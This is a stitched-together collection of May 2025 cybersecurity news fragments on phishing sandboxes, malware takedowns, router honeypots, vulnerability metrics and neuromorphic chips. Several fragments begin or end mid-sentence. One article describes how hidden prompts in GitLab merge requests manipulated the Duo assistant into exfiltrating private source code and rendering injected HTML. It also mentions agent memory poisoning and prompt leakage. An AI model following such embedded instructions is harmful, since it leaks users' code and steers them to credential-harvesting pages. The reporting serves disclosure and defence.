click?\n\nInside the sandbox session, we see it clearly:\n\nAs soon as the button is pressed, a series of redirects (another evasion tactic) eventually lead us to a page with a CAPTCHA challenge. This is where automated tools typically fail. They can't click buttons, solve CAPTCHAs, or mimic user behavior, so they often miss the real threat.\n\nBut in ANY.RUN's Interactive Sandbox, isn't a problem. You can either solve the CAPTCHA manually or enable the auto mode to let the sandbox handle it for you. In both cases, the analysis continues smoothly, allowing you to reach the final phishing page and observe the full attack chain.\n\nOnce the CAPTCHA is solved, we're redirected to a fake Microsoft login page. At first glance, it looks convincing, but a closer look reveals the truth:\n\nWithout the Interactive Sandbox, these details would remain hidden. But here, every move is visible, every step traceable, making it easier to detect phishing infrastructure before it tricks someone inside your organization.\n\nIf left undetected, the victim may unknowingly enter their credentials into the fake login page, handing sensitive access directly to the attacker.\n\nBy making sandbox analysis part of your security routine, your team can check suspicious links or files in seconds. In most cases, ANY.RUN provides an initial verdict in under 40 seconds.\n\nOnce the phishing chain is fully detonated, the next step is what matters most to security teams; gathering indicators of compromise (IOCs) that can be used for detection, response, and future prevention.\n\nSolutions like ANY.RUN makes this process fast and centralized. Here are some of the key findings from our phishing sample:\n\nIn the top-right corner, we see the process tree, which helps us trace suspicious behavior. One process stands out; it's labeled \"Phishing\", showing exactly where the malicious activity occurred.\n\nBelow the VM window, in the Network connections tab, we can inspect all HTTP/HTTPS requests. This reveals the external infrastructure used in the attack: domains, IPs, and more.\n\nIn the Threats section, we see a Suricata alert: PHISHING [ANY.RUN] Suspected Tycoon2FA's Phishing-Kit Domain. This confirms the phishing kit used and adds useful context for threat classification.\n\nIn the top panel, the tags instantly identify it as a Tycoon2FA-related threat, so analysts know what they're dealing with at a glance.\n\nNeed to see all IOCs in one place? Just click the IOC button, and you'll get a full list of domains, hashes, URLs, and more. No need to jump between tools or gather data manually.\n\nThese IOCs can then be used to:\n\nFinally, ANY.RUN generates a well-structured, shareable report that includes all key details, from behavior logs and network traffic to screenshots and IOCs.\n\nThis report is perfect for documentation, team handoff, or sharing with external stakeholders, saving valuable time during response.\n\nInteractive sandboxing helps teams cut through the noise, exposing real threats quickly and making incident response more efficient.\n\nSolutions like ANY.RUN makes this process accessible to both experienced teams and those just starting to build up threat detection capabilities:\n\nSpecial Offer: From May 19 to May 31, 2025, ANY.RUN is celebrating its 9th birthday with exclusive offers.\n\nEquip your team with extra sandbox licenses and grab limited-time offers across their Sandbox, TI Lookup, and Security Training Lab.\n\nLearn more about ANY.RUN's Birthday special offers→\n\nPhishing attacks are getting smarter but detecting them doesn't have to be hard. With interactive sandboxing, you can spot threats early, trace the full attack chain, and collect all the evidence your team needs to respond quickly and confidently.",

The previous edition focused on dismantling the initial access malware families that have been used to deliver ransomware.\n\nThe latest iteration, per Europol, targeted new malware variants and successor groups that re-emerged after last year's takedowns such as Bumblebee, Lactrodectus, QakBot, HijackLoader, DanaBot, TrickBot, and WARMCOOKIE. The interaction action was carried out between May 19 and 22, 2025.\n\n\"In addition, €3.5 million in cryptocurrency was seized during the action week, bringing the total amount seized during the Operation Endgame to more than €21.2 million,\" the agency said.\n\nEuropol noted that the malware variants are offered as a service to other threat actors and are used to conduct large-scale ransomware attacks. Furthermore, international arrest warrants have been issued against 20 key actors who are believed to be providing or operating initial access services to ransomware crews.\n\n\"This new phase demonstrates law enforcement's ability to adapt and strike again, even as cybercriminals retool and reorganize,\" Europol Executive Director Catherine De Bolle said. \"By disrupting the services criminals rely on to deploy ransomware, we are breaking the kill chain at its source.\"\n\nGermany's Federal Criminal Police Office (aka Bundeskriminalamt or BKA) has revealed that criminal proceedings have been initiated against 37 identified actors. Some of the individuals who have been added to the E.U. Most Wanted list are listed below -\n\nThe disclosure comes as Europol took the wraps off a large-scale law enforcement operation that resulted in 270 arrests of dark web vendors and buyers across 10 countries: the United States (130), Germany (42), the United Kingdom (37), France (29), South Korea (19), Austria (4), the Netherlands (4), Brazil (3), Switzerland (1), and Spain (1).\n\nThe suspects, Europol noted, were identified based on intelligence gathered from the takedowns of the dark web marketplaces Nemesis, Tor2Door, Bohemia, and Kingdom Markets. Several suspects are alleged to have conducted thousands of sales on illicit marketplaces, often using encryption tools and cryptocurrencies to conceal their digital footprints.\n\n\"Known as Operation RapTor, this international sweep has dismantled networks trafficking in drugs, weapons, and counterfeit goods, sending a clear signal to criminals hiding behind the illusion of anonymity,\" Europol said.\n\nAlong with the arrests, €184 million in cash and cryptocurrencies, 2 tons of drugs, 180 firearms, 12,500 counterfeit products, and more than 4 tons of illegal tobacco have been seized by authorities. The joint action follows Operation SpecTor in May 2023, which led to the arrest of 288 dark web vendors and buyers and the seizure of €50.8 million in cash and cryptocurrency.\n\n\"With traditional marketplaces under increasing pressure, criminal actors are shifting to smaller, single-vendor shops — sites run by individual sellers to avoid marketplace fees and minimize exposure,\" Europol said. \"Illegal drugs remain the top commodity sold on the dark web, but 2023 also saw a surge in prescription drug trafficking and a rise in fraudulent services, including fake hitmen and bogus listings designed to scam buyers.\"",

        "content": "날짜: May 23, 2025\n\n본문:\nCybersecurity researchers have disclosed that a threat actor codenamed ViciousTrap has compromised nearly 5,300 unique network edge devices across 84 countries and turned them into a honeypot-like network.\n\nThe threat actor has been observed exploiting a critical security flaw impacting Cisco Small Business RV016, RV042, RV042G, RV082, RV320, and RV325 Routers (CVE-2023-20118) to corral them into a set of honeypots en masse. A majority of the infections are located in Macau, with 850 compromised devices.\n\n\"The infection chain involves the execution of a shell script, dubbed NetGhost, which redirects incoming traffic from specific ports of the compromised router to a honeypot-like infrastructure under the attacker's control allowing them to intercept network flows,\" Sekoia said in an analysis published Thursday.\n\nIt's worth noting that the exploitation of CVE-2023-20118 was previously attributed by the French cybersecurity company to another botnet dubbed PolarEdge.\n\nWhile there is no evidence that these two sets of activities are connected, it's believed that the threat actor behind ViciousTrap is likely setting up honeypot infrastructure by breaching a wide range of internet-facing equipment, including SOHO routers, SSL VPNs, DVRs, and BMC controllers from more than 50 brands like Araknis Networks, ASUS, D-Link, Linksys, and QNAP.\n\n\"This setup would allow the actor to observe exploitation attempts across multiple environments and potentially collect non-public or zero-day exploits, and reuse access obtained by other threat actors,\" it added.\n\nThe attack chain entails the weaponization of CVE-2023-20118 to download and execute a bash script via ftpget, which then contacts an external server to fetch the wget binary. In the next step, the Cisco flaw is exploited a second time, using it to execute a second script retrieved using the previously dropped wget.\n\nThe second-stage shell script, internally referenced as NetGhost, is configured to redirect network traffic from the compromised system to third-party infrastructure controlled by the attacker, thereby facilitating adversary-in-the-middle (AitM) attacks. It also comes with capabilities to remove itself from the compromised host to minimize forensic trail.\n\nSekoia said all exploitation attempts have originated from a single IP address (\"101.99.91[.]151\"), with the earliest activity dating back to March 2025. In a noteworthy event observed a month later, the ViciousTrap actors are said to have repurposed an undocumented web shell previously employed in PolarEdge botnet attacks for their own operations.\n\n\"This assumption aligns with the attacker's use of NetGhost,\" security researchers Felix Aimé and Jeremy Scion said. \"The redirection mechanism effectively positions the attacker as a silent observer, capable of collecting exploitation attempts and, potentially, web shell accesses in transit.\"\n\nAs recently as this month, exploitation efforts have also targeted ASUS routers but from a different IP address (\"101.99.91[.]239\"), although the threat actors have not been found to create any honeypot on the infected devices. All the IP addresses actively used in the campaign are located in Malaysia and are part of an Autonomous System (AS45839) operated by hosting provider Shinjiru.\n\nThe actor is believed to be of Chinese-speaking origin on the basis of a weak overlap with the GobRAT infrastructure and the fact that traffic is redirected to numerous assets in Taiwan and the United States.\n\n\"The final objective of ViciousTrap remains unclear even [though] we assess with high confidence that it's a honeypot-style network,\" Sekoia concluded.",

        "content": "날짜: May 23, 2025\n\n본문:\nCybersecurity researchers have discovered an indirect prompt injection flaw in GitLab's artificial intelligence (AI) assistant Duo that could have allowed attackers to steal source code and inject untrusted HTML into its responses, which could then be used to direct victims to malicious websites.\n\nGitLab Duo is an artificial intelligence (AI)-powered coding assistant that enables users to write, review, and edit code. Built using Anthropic's Claude models, the service was first launched in June 2023.\n\nBut as Legit Security found, GitLab Duo Chat has been susceptible to an indirect prompt injection flaw that permits attackers to \"steal source code from private projects, manipulate code suggestions shown to other users, and even exfiltrate confidential, undisclosed zero-day vulnerabilities.\"\n\nPrompt injection refers to a class of vulnerabilities common in AI systems that enable threat actors to weaponize large language models (LLMs) to manipulate responses to users' prompts and result in undesirable behavior.\n\nIndirect prompt injections are a lot more trickier in that instead of providing an AI-crafted input directly, the rogue instructions are embedded within another context, such as a document or a web page, which the model is designed to process.\n\nRecent studies have shown that LLMs are also vulnerable to jailbreak attack techniques that make it possible to trick AI-driven chatbots into generating harmful and illegal information that disregards their ethical and safety guardrails, effectively obviating the need for carefully crafted prompts.\n\nWhat's more, Prompt Leakage (PLeak) methods could be used to inadvertently reveal the preset system prompts or instructions that are meant to be followed by the model.\n\n\"For organizations, this means that private information such as internal rules, functionalities, filtering criteria, permissions, and user roles can be leaked,\" Trend Micro said in a report published earlier this month. \"This could give attackers opportunities to exploit system weaknesses, potentially leading to data breaches, disclosure of trade secrets, regulatory violations, and other unfavorable outcomes.\"\n\nThe latest findings from the Israeli software supply chain security firm show that a hidden comment placed anywhere within merge requests, commit messages, issue descriptions or comments, and source code was enough to leak sensitive data or inject HTML into GitLab Duo's responses.\n\nThese prompts could be concealed further using encoding tricks like Base16-encoding, Unicode smuggling, and KaTeX rendering in white text in order to make them less detectable. The lack of input sanitization and the fact that GitLab did not treat any of these scenarios with any more scrutiny than it did source code could have enabled a bad actor to plant the prompts across the site.\n\n\"Duo analyzes the entire context of the page, including comments, descriptions, and the source code — making it vulnerable to injected instructions hidden anywhere in that context,\" security researcher Omer Mayraz said.\n\nThis also means that an attacker could deceive the AI system into including a malicious JavaScript package in a piece of synthesized code, or present a malicious URL as safe, causing the victim to be redirected to a fake login page that harvests their credentials.\n\nOn top of that, by taking advantage of GitLab Duo Chat's ability to access information about specific merge requests and the code changes inside of them, Legit Security found that it's possible to insert a hidden prompt in a merge request description for a project that, when processed by Duo, causes the private source code to be exfiltrated to an attacker-controlled server.\n\nThis, in turn, is made possible owing to its use of streaming markdown rendering to interpret and render the responses into HTML as the output is generated. In other words, feeding it HTML code via indirect prompt injection could cause the code segment to be executed on the user's browser.\n\nFollowing responsible disclosure on February 12, 2025, the issues have been addressed by GitLab.\n\n\"This vulnerability highlights the double-edged nature of AI assistants like GitLab Duo: when deeply integrated into development workflows, they inherit not just context — but risk,\" Mayraz said.\n\n\"By embedding hidden instructions in seemingly harmless project content, we were able to manipulate Duo's behavior, exfiltrate private source code, and demonstrate how AI responses can be leveraged for unintended and harmful outcomes.\"\n\nThe disclosure comes as Pen Test Partners revealed how Microsoft Copilot for SharePoint, or SharePoint Agents, could be exploited by local attackers to access sensitive data and documentation, even from files that have the \"Restricted View\" privilege.\n\n\"One of the primary benefits is that we can search and trawl through massive datasets, such as the SharePoint sites of large organisations, in a short amount of time,\" the company said. \"This can drastically increase the chances of finding information that will be useful to us.\"\n\nThe attack techniques follow new research that ElizaOS (formerly Ai16z), a nascent decentralized AI agent framework for automated Web3 operations, could be manipulated by injecting malicious instructions into prompts or historical interaction records, effectively corrupting the stored context and leading to unintended asset transfers.\n\n\"The implications of this vulnerability are particularly severe given that ElizaOSagents are designed to interact with multiple users simultaneously, relying on shared contextual inputs from all participants,\" a group of academics from Princeton University wrote in a paper.\n\n\"A single successful manipulation by a malicious actor can compromise the integrity of the entire system, creating cascading effects that are both difficult to detect and mitigate.\"\n\nPrompt injections and jailbreaks aside, another significant issue ailing LLMs today is hallucination, which occurs when the models generate responses that are not based on the input data or are simply fabricated.\n\nAccording to a new study published by AI testing company Giskard, instructing LLMs to be concise in their answers can negatively affect factuality and worsen hallucinations.\n\n\"This effect seems to occur because effective rebuttals generally require longer explanations,\" it said. \"When forced to be concise, models face an impossible choice between fabricating short but inaccurate answers or appearing unhelpful by rejecting the question entirely.\"",

Two of the defendants, Aleksandr Stepanov (aka JimmBee), 39, and Artem Aleksandrovich Kalinkin (aka Onix), 34, both from Novosibirsk, Russia, are currently at large.\n\nStepanov has been charged with conspiracy, conspiracy to commit wire fraud and bank fraud, aggravated identity theft, unauthorized access to a protected computer to obtain information, unauthorized impairment of a protected computer, wiretapping, and use of an intercepted communication. Kalinkin has been charged with conspiracy to gain unauthorized access to a computer to obtain information, to gain unauthorized access to a computer to defraud, and to commit unauthorized impairment of a protected computer.\n\nThe unsealed criminal complaint and indictment show that many of the defendants, counting Kalinkin, exposed their real-life identities after accidentally infecting their own systems with the malware.\n\n\"In some cases, such self-infections appeared to be deliberately done in order to test, analyze, or improve the malware,\" the complaint [PDF] read. \"In other cases, the infections seemed to be inadvertent – one of the hazards of committing cybercrime is that criminals will sometimes infect themselves with their own malware by mistake.\"\n\n\"The inadvertent infections often resulted in sensitive and compromising data being stolen from the actor's computer by the malware and stored on the DanaBot servers, including data that helped identify members of the DanaBot organization.\"\n\nIf convicted, Kalinkin is expected to face a statutory maximum sentence of 72 years in federal prison. Stepanov would face a jail term of five years. Concurrent with the action, the law enforcement effort, carried out as part of Operation Endgame, saw DanaBot's command-and-control (C2) servers seized, including dozens of virtual servers hosted in the United States.\n\n\"DanaBot malware used a variety of methods to infect victim computers, including spam email messages containing malicious attachments or hyperlinks,\" the DoJ said. \"Victim computers infected with DanaBot malware became part of a botnet (a network of compromised computers), enabling the operators and users of the botnet to remotely control the infected computers in a coordinated manner.\"\n\nDanaBot, like the recently dismantled Lumma Stealer malware, operates under a malware-as-a-service (MaaS) scheme, with the administrators leasing out access starting from $500 to \"several thousand dollars\" a month. Tracked under the monikers Scully Spider and Storm-1044, is a multi-functional tool along the lines of Emotet, TrickBot, QakBot, and IcedID that's capable of acting as a stealer and a delivery vector for next-stage payloads, such as ransomware.\n\nThe Delphi-based modular malware is equipped to siphon data from victim computers, hijack banking sessions, and steal device information, user browsing histories, stored account credentials, and virtual currency wallet information. It can also provide full remote access, log keystrokes, and capture videos. It's been active in the wild since its debut in May 2018, when it started off as a banking trojan.\n\n\"DanaBot initially targeted victims in Ukraine, Poland, Italy, Germany, Austria, and Australia prior to expanding its targeting posture to include U.S.- and Canada-based financial institutions in October 2018,\" CrowdStrike said. \"The malware's popularity grew due to its early modular development supporting Zeus-based web injects, information stealer capabilities, keystroke logging, screen recording, and hidden virtual network computing (HVNC) functionality.\"\n\nAccording to Black Lotus Labs and Team Cymru, DanaBot employs a layered communications infrastructure between a victim and the botnet controllers, wherein the C2 traffic is proxied through two or three server tiers before it reaches the final level. At least five to six tier-2 servers were active at any given time. A majority of DanaBot victims are concentrated around Brazil, Mexico, and the United States.\n\n\"The operators have shown their commitment to their craft, adapted to detection and changes in enterprise defense, and with later iterations, insulating the C2s in tiers to obfuscate tracking,\" the companies said. \"Throughout this time, they have made the bot more user-friendly with structured pricing and customer support.\"\n\nTelemetry data gathered by Proofpoint shows that DanaBot was \"nearly entirely absent\" from the email threat landscape from July 2020 through June 2024, indicating that threat actors propagated the malware through other methods like SEO poisoning and malvertising campaigns.\n\nThe DoJ said DanaBot administrators operated a second version of the botnet that was specially designed to target victim computers in military, diplomatic, government, and related entities in North America and Europe. This variant, emerging in January 2021, came fitted with capabilities to record all interactions happening on a victim device and send the data to a different server.\n\n\"Pervasive malware like DanaBot harms hundreds of thousands of victims around the world, including sensitive military, diplomatic, and government entities, and causes many millions of dollars in losses,\" said United States Attorney Bill Essayli for the Central District of California.\n\nThe DoJ further credited several private sector firms, Amazon, CrowdStrike, ESET, Flashpoint, Google, Intel 471, Lumen, PayPal, Proofpoint, Spycloud, Team Cymru, and Zscaler, for providing \"valuable assistance.\"\n\nSome of the noteworthy aspects of DanaBot, compiled from various reports, are below -\n\nProofpoint, which first identified and named DanaBot in May 2018, said the disruption of the MaaS operation is a win for defenders and that it will have an impact on the cybercriminal threat landscape.\n\n\"Cybercriminal disruptions and law enforcement actions not only impair malware functionality and use but also impose a cost to threat actors by forcing them to change their tactics, cause mistrust in the criminal ecosystem, and potentially make criminals think about finding a different career,\" Selena Larson, a staff threat researcher at Proofpoint, said.\n\n\"These successes against cyber criminals only come about when business IT teams and security service providers share much-needed insight into the biggest threats to society, affecting the greatest number of people around the world, which law enforcement can use to track down the servers, infrastructure, and criminal organizations behind the attacks. Private and public sector collaboration is crucial to knowing how actors operate and taking action against them.\"\n\nThe development comes as the DoJ unsealed charges against a 48-year-old Moscow resident, Rustam Rafailevich Gallyamo, for leading efforts to develop and maintain the QakBot malware, which was disrupted in a multinational operation in August 2023. The agency also filed a civil forfeiture complaint against over $24 million in cryptocurrency seized from Gallyamov over the course of the investigation.\n\n\"Gallyamov developed, deployed, and controlled the Qakbot malware beginning in 2008,\" the DoJ said. \"From 2019 onward, Gallyamov allegedly used the Qakbot malware to infect thousands of victim computers around the world in order to establish a network, or 'botnet,' of infected computers.\"\n\nThe DoJ revealed that, following the takedown, Gallyamov and his co-conspirators continued their criminal activities by switching to other tactics like \"spam bomb\" attacks in order to gain unauthorized access to victim networks and deploy ransomware families like Black Basta and CACTUS. Court documents accuse the e-crime group of engaging in these methods as recently as January 2025.\n\n\"Mr. Gallyamov's bot network was crippled by the talented men and women of the FBI and our international partners in 2023, but he brazenly continued to deploy alternative methods to make his malware available to criminal cyber gangs conducting ransomware attacks against innocent victims globally,\" said Assistant Director in Charge Akil Davis of the FBI's Los Angeles Field Office.",

        "content": "날짜: May 22, 2025\n\n본문:\nFor many organizations, identity security appears to be under control. On paper, everything checks out. But new research from Cerby, based on insights from over 500 IT and security leaders, reveals a different reality: too much still depends on people—not systems—to function. In fact, fewer than 4% of security teams have fully automated their core identity workflows.\n\nCore workflows, like enrolling in Multi Factor Authentication (MFA), keeping credentials secure and up to date, and revoking access the moment someone leaves—are often manual, inconsistent, and vulnerable to error. And when security execution relies on memory or follow-up, gaps appear fast.\n\nHuman error remains one of the biggest threats to enterprise security. Verizon's 2025 Data Breach report found that the human element was involved in 60% of breaches. The same manual missteps that led to breaches a decade ago still expose identity systems today. Cerby's 2025 Identity Automation Gap research report shows just how widespread the issue is—and how far automation still has to go.\n\nThe data reveals a persistent reliance on human action for tasks that should be automated across the identity security lifecycle.\n\nThe consequences are no longer hypothetical.\n\nAccording to the Ponemon Institute, 52% of enterprises have experienced a security breach caused by manual identity work in disconnected applications. Most of them had four or more. The downstream impact was tangible: 43% reported customer loss, and 36% lost partners.\n\nThese failures are predictable and preventable, but only if organizations stop relying on humans to carry out what should be automated. Identity is no longer a background system. It's one of the primary control planes in enterprise security. As attack surfaces expand and threat actors become more sophisticated, the automation gap becomes harder—and riskier—to ignore.\n\nWhy do these manual gaps still exist if automation is so critical to identity security? They've emerged as a byproduct of rapid growth, application sprawl, and fragmented infrastructure.\n\nThe good news: closing the automation gap doesn't require rebuilding or replacing your identity stack. It means completing it.\n\nForward-thinking organizations are bringing automation to every corner of their application ecosystem without waiting for native integrations. Some teams are also exploring AI agents to help close this gap. But trust is still evolving: 78% of security leaders say they don't trust AI to fully automate core identity tasks—yet 45% support a collaborative human-in-the-loop model.\n\nCerby provides organizations with the flexibility to support both approaches—meeting teams where they are and delivering automation where it's needed most.\n\nCerby's research report, The 2025 Identity Automation Gap, includes findings from 500+ IT and security leaders and practical steps for closing one of the most overlooked risks in enterprise security.\n\nDownload the full report or schedule a 15-minute demo to see how Cerby brings automation across your entire identity surface.",

It's worth mentioning here that FRP is an open-source tool widely shared among Chinese hacking groups.\n\nEclecticIQ said it also identified a command-and-control (C2) server associated with Auto-Color, a Linux backdoor that was documented by Palo Alto Networks Unit 42 as used in attacks aimed at universities and government organizations in North America and Asia between November and December 2024.\n\n\"The IP address 146.70.87[.]67:45020, previously associated with Auto-Color command-and-control infrastructure, was seen issuing outbound connectivity tests via curl immediately after exploitation of Ivanti EPMM servers,\" Büyükkaya pointed out. \"This behaviour is consistent with Auto-Color's staging and beaconing patterns. Taken together, these indicators very likely link to China-nexus activity.\"\n\nThe disclosure comes as threat intelligence firm GreyNoise noted that it had witnessed a significant spike in scanning activity targeting Ivanti Connect Secure and Pulse Secure products prior to the disclosure of CVE-2025-4427 and CVE-2025-4428.\n\n\"While the scanning we observed was not directly tied to EPMM, the timeline underscores a critical reality: scanning activity often precedes the public emergence of zero-day vulnerabilities,\" the company said. \"It's a leading indicator — a signal that attackers are probing critical systems, potentially in preparation for future exploitation.\"",

        "title": "Hackers Use Fake VPN and Browser NSIS Installers to Deliver Winos 4.0 Malware",
        "content": "날짜: May 25, 2025\n\n본문:\nCybersecurity researchers have disclosed a malware campaign that uses fake software installers masquerading as popular tools like LetsVPN and QQ Browser to deliver the Winos 4.0 framework.\n\nThe campaign, first detected by Rapid7 in February 2025, involves the use of a multi-stage, memory-resident loader called Catena.\n\n\"Catena uses embedded shellcode and configuration switching logic to stage payloads like Winos 4.0 entirely in memory, evading traditional antivirus tools,\" security researchers Anna Širokova and Ivan Feigl said. \"Once installed, it quietly connects to attacker-controlled servers – mostly hosted in Hong Kong – to receive follow-up instructions or additional malware.\"\n\nThe attacks, like those that have deployed Winos 4.0 in the past, appear to focus specifically on Chinese-speaking environments, with the cybersecurity company calling out the \"careful, long-term planning\" by a very capable threat actor.\n\nWinos 4.0 (aka ValleyRAT) was first publicly documented by Trend Micro in June 2024 as used in attacks targeting Chinese-speaking users by means of malicious Windows Installer (MSI) files for VPN apps. The activity has been attributed to a threat cluster it tracks as Void Arachne, which is also referred to as Silver Fox.\n\nSubsequent campaigns distributing the malware have leveraged gaming-related applications like installation tools, speed boosters, and optimization utilities as lures to trick users into installing it. Another attack wave detailed in February 2025 targeted entities in Taiwan via phishing emails that purported to be from the National Taxation Bureau.\n\nBuilt atop the foundations of a known remote access trojan called Gh0st RAT, Winos 4.0 is an advanced malicious framework written in C++ that makes use of a plugin-based system to harvest data, provide remote shell access, and launch distributed denial-of-service (DDoS) attacks.\n\nRapid7 said all the artifacts flagged in February 2025 relied on NSIS installers bundled with signed decoy apps, shellcode embedded in \".ini\" files, and reflective DLL injection to covertly maintain persistence on infected hosts and avoid detection. The entire infection chain has been given the moniker Catena.\n\n\"The campaign has so far been active throughout 2025, showing a consistent infection chain with some tactical adjustments – pointing to a capable and adaptive threat actor,\" the researchers said.\n\nThe starting point is a trojanized NSIS installer impersonating an installer for QQ Browser, a Chromium-based web browser developed by Tencent, that's designed to deliver Winos 4.0 using Catena. The malware communicates with hard-coded command-and-control (C2) infrastructure over TCP port 18856 and HTTPS port 443.\n\nPersistence on the host is achieved by registering scheduled tasks that are executed weeks after the initial compromise. While the malware features an explicit check to look for Chinese language settings on the system, it still proceeds with the execution even if that's not the case.\n\nThis indicates it's an unfinished feature and something that's expected to be implemented in subsequent iterations of the malware. That said, Rapid7 said it identified in April 2025 a \"tactical shift\" that not only switched some of the elements of the Catena execution chain, but also incorporated features to evade antivirus detection.\n\nIn the revamped attack sequence, the NSIS installer disguises itself as a setup file for LetsVPN and runs a PowerShell command that adds Microsoft Defender exclusions for all drives (C:\\ to Z:\\). It then drops additional payloads, including an executable that takes a snapshot of running processes and checks for processes related to 360 Total Security, an antivirus product developed by Chinese vendor Qihoo 360.\n\nThe binary is signed with an expired certificate issued by VeriSign and allegedly belongs to Tencent Technology (Shenzhen). It was valid from 2018-10-11 to 2020-02-02. The primary responsibility of the executable is to reflectively load a DLL file that, in turn, connects to a C2 server (\"134.122.204[.]11:18852\" or \"103.46.185[.]44:443\") in order to download and execute Winos 4.0.\n\n\"This campaign shows a well-organized, regionally focused malware operation using trojanized NSIS installers to quietly drop the Winos 4.0 stager,\" the researchers said.\n\n\"It leans heavily on memory-resident payloads, reflective DLL loading, and decoy software signed with legit certificates to avoid raising alarms. Infrastructure overlaps and language-based targeting hint at ties to Silver Fox APT, with activity likely aimed at Chinese-speaking environments.\"",

There is also no way to prevent this attack as an O2 customer. Disabling 4G Calling does not prevent these headers from being revealed,” he notes.\n\nThe issue impacted O2’s 4G Calling service from its launch in March until recently, when the company rolled out a fix.\n\n“Our engineering teams have been working on and testing a fix for a number of weeks – we can confirm this is now fully implemented and tests suggest the fix has worked and our customers do not need to take any action,” O2 and Virgin Media spokespersons told SecurityWeek.\n\nRelated: LTE, 5G Vulnerabilities Could Cut Entire Cities From Cellular Connectivity\n\nRelated: Fitness App Strava Gives Away Location of Biden, Trump and other Leaders, French Newspaper Says\n\nRelated: FCC Fines Wireless Carriers for Sharing User Locations Without Consent",

        "content": "날짜: 2025-05-20\n\n요약: The Likely Exploited Vulnerabilities (LEV) equations can help augment KEV- and EPSS-based remediation prioritization.\n\n본문:\nResearchers from CISA and NIST have proposed a new cybersecurity metric designed to calculate the likelihood that a vulnerability has been exploited in the wild.\n\nPeter Mell of NIST and Jonathan Spring of CISA have published a paper describing equations for what they call Likely Exploited Vulnerabilities, or LEV.\n\nThousands of vulnerabilities are discovered every year in software and hardware, but only a small percentage are ever exploited in the wild.\n\nKnowing which vulnerabilities have been exploited or predicting which flaws are likely to be exploited is important for organizations when trying to prioritize patching.\n\nKnown Exploited Vulnerabilities (KEV) lists such as the one maintained by CISA and the Exploit Prediction Scoring System (EPSS), which relies on data to estimate the probability that a vulnerability will be exploited, can be very useful. However, KEV lists may be incomplete and EPSS may be inaccurate.\n\nLEV aims to enhance — not replace — KEV lists and EPSS. This is done through equations that take into account variables such as the first date when an EPSS score is available for a specified vulnerability, the date of the most recent KEV list update, inclusion in KEV, and the EPSS score for a given day (measured across multiple days).\n\nLEV probabilities can be useful for measuring the expected number and proportion of vulnerabilities that threat actors have exploited.\n\nIt can also be useful for estimating the comprehensiveness of KEV lists. “Previously, KEV maintainers had no metric to demonstrate how close their list was to including all relevant vulnerabilities,” the researchers explained.\n\nIn addition, LEV probabilities can help augment KEV- and EPSS-based vulnerability remediation prioritization — in the case of KEV by identifying higher-probability vulnerabilities that may be missing, and in the case of EPSS by finding vulnerabilities that may be underscored.\n\nWhile in theory LEV could turn out to be a very useful tool for vulnerability prioritization, the researchers pointed out that collaboration is necessary, and NIST is looking for industry partners “with relevant datasets to empirically measure the performance of LEV probabilities”.\n\nRelated: Exploitation Long Known for Most of CISA’s Latest KEV Additions\n\nRelated: Critical Vulnerability in AI Builder Langflow Under Attack\n\nRelated: CISA Warns of Exploited Broadcom, Commvault Vulnerabilities",

        "title": "Spiking Neural Networks: Brain-Inspired Chips That Could Keep Your Data Safe",
        "content": "날짜: 2025-05-19\n\n요약: Neuromorphic computing is moving from theory to reality, with brain-inspired processors offering real-time intelligence, low power consumption, and built-in privacy—ushering in a new era for edge devices and cybersecurity.\n\n본문:\nThere are different types of neural networks offering great potential for security in the future; but the spiking neural networks (SNN) type of neuromorphic computing is available now, promising improvements in performance and personal and AI privacy.\n\nNeuromorphic computing attempts to improve traditional (Von Neumann model) computing by collocating memory and processor, by encouraging parallel processing, and by being event driven. The idea takes inspiration from the biological map and functioning of the human brain. The result can, in theory, dramatically increase the speed of processing and decrease the consumption of electrical power.\n\nIts primary components implemented in silicon are artificial neurons (providing basic processing capabilities), synapses (providing communication between neurons) and memory elements (storing the state of the neurons and the weights of the synapses).\n\n“It is,” explains Jamie Boote, a principal security consultant at Black Duck, “a type of deep learning that models hardware and software architecture on natural structures (mostly neurons) implemented in silicon that mimics how neurons create and break connections with each other.”\n\nAn SNN is typified by translating data into short bursts of electrical signals known as ‘spikes’. It is the pattern of the voltage spikes that contains the data. The volume of neurons able to respond to data (effectively, an event) allows large scale multiprocessing on a single device, reducing footprint, elapsed processing time, and power consumption.\n\nIt is worth noting neuromorphic computing is not synonymous with the deep neural networks (DNNs) already in wide use within industry – although there is growing interest in using the former to accelerate the latter. An SNN model can be up to 100 times smaller than a conventional DNN model as used today.\n\nNeuromorphic computing is a developing field, and its applications are still being explored and researched. Its strengths, however, indicate numerous areas where it may prove superior to traditional Von Neumann style computers. Just to recap, those strengths include the ability to process data with massive parallelism close to or at the source (that is, at the edge), very low power consumption (that is, ideal for devices that are battery powered), event driven and the ability to learn and adapt in real time and autonomously.\n\nWorking at the edge with a long battery life makes them suitable for smart sensors, as used in drones, wearable devices and IoT in general. Coupled with radar and/or infra-red sensors, they could provide numerous applications within facilities management – from automated light switches through detection of unauthorized physical access in sensitive areas to locating any persons left behind in a large building (major hotel or office complex) following an evacuation. Within robotics and autonomous systems, the fast (parallel) processing provides instant object recognition for navigation in dynamic environments. In healthcare, the event-driven element is ideal for monitoring physiological conditions.\n\nWithin corporate IT infrastructures and cybersecurity, the ability to respond instantly to changing patterns could provide instant recognition or indication of a cyberattack, while fast processing could detect and respond to security threats in general. The potential exists but has yet to be realized; and cybersecurity professionals are largely in the wait and see phase.\n\n“If it can deliver on the promised adherent characteristics,” says Kris Bondi, CEO and co-founder of Mimoto, “it will address several key failings of legacy security solutions. While most anomaly detection is relegated to after breach forensics, neuromorphic computing promises to analyze user behaviors faster and more granularly to identify and respond to threats in real-time.”\n\nSatyam Sinha, CEO and co-founder at Acuvity comments, “These [neuromorphic] traits are very beneficial to tasks such as threat detection and response as they aid in processing large amounts of network traffic in real-time. It also enables scaling up to detect anomalies and adapt to new attack vectors to provide a more accurate analysis. Neuromorphic systems can also process data locally on devices or on the edge networks which reduce the need for centralized data storage. In addition to better efficiency, this approach improves privacy in AI applications as it requires less transmission of data, reducing the number of transit points where the data can be intercepted or leaked.”\n\nBut Bondi adds, “There are also known limitations of neuromorphic computing that need to be overcome before it can become a stable, commercial security solution. These include the ability to work with unstructured data or to conduct real-time data processing, which are critical requirements for enterprise-ready solutions.”\n\nThe biggest problem right now for market adoption is the market’s lack of understanding and the absence of a track record in use. “Neuromorphic computing is still new, barely more than experimental; and not yet properly understood by the engineers who will benefit from its use.” Inertia reigns. “The more advanced and more probabilistic the system, the less the average engineer will understand it,” suggests David Benas, a principal security consultant at Black Duck.”\n\n“Unfortunately,” says Madhu Shashanka, chief data scientist and co-founder at Concentric AI, “it has become 